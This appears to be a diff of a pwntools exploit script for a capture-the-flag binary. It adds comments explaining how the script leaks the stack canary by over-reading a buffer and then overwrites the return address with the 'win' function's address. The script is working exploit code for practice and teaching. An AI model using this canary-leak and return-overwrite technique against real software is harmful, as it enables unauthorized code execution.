@@ -51,28 +51,19 @@ if args.GDB:
     io.interactive()
 
 log.info(io.recv())
-io.sendline(b"0")
+io.sendline(b"0") # ask for read
 log.info(io.recv())
-io.sendline(b"13")
+io.sendline(b"13") # read 13*8 bytes, full buffer + canary
 
 canary = io.recv()[:8]
 
 log.info("Canary found :" + str(canary[:8]))
 log.info(canary * 14 + p64(exe.symbols["win"]) * 3)
 
-io.sendline(b"1")
-io.sendline(b"128")
-io.sendline(canary * 14 + p64(exe.symbols["win"]) * 3)
+io.sendline(b"1") # ask for write 
+io.sendline(b"128") # write 128 bytes (make sure to go far enough)
+io.sendline(canary * 14 + p64(exe.symbols["win"]) * 3) # put the canary in place and override return address with `win` address
 
-io.sendline(b"2")
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+io.sendline(b"2") # leave the function to go to return address
 
 io.interactive()
